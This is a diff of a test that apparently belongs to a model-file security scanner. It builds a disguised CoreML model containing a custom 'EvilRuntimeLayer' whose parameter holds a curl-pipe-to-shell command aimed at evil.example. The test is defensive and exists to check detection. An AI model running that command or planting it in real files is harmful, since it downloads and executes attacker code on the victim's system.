@@ -259,7 +259,7 @@ class TestDirectoryFileFiltering:
             custom_class="EvilRuntimeLayer",
             custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
         )
-        disguised_coreml.write_bytes(b"\x9a\x06\x03pad" + disguised_coreml.read_bytes())
+        disguised_coreml.write_bytes(b"\x9b\x06\x08\x01\x9c\x06" + disguised_coreml.read_bytes())
 
         results = scan_model_directory_or_file(str(tmp_path))
 
